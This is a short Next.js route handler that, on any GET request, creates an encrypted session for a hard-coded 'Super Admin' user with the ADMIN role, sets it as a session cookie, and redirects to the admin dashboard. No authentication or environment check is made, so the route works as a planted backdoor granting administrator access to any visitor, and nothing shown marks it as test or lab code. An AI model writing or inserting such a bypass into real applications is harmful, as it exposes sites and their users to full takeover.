import { NextRequest, NextResponse } from 'next/server';
import { encrypt } from '@/lib/auth';
import { cookies } from 'next/headers';

export async function GET(request: NextRequest) {
  const expires = new Date(Date.now() + 24 * 60 * 60 * 1000);
  const session = await encrypt({ 
    id: 'admin-bypass-id', 
    name: 'Super Admin', 
    role: 'ADMIN',
    expires 
  });

  (await cookies()).set('session', session, { expires, httpOnly: true });

  return NextResponse.redirect(new URL('/admin/dashboard', request.nextUrl.origin));
}
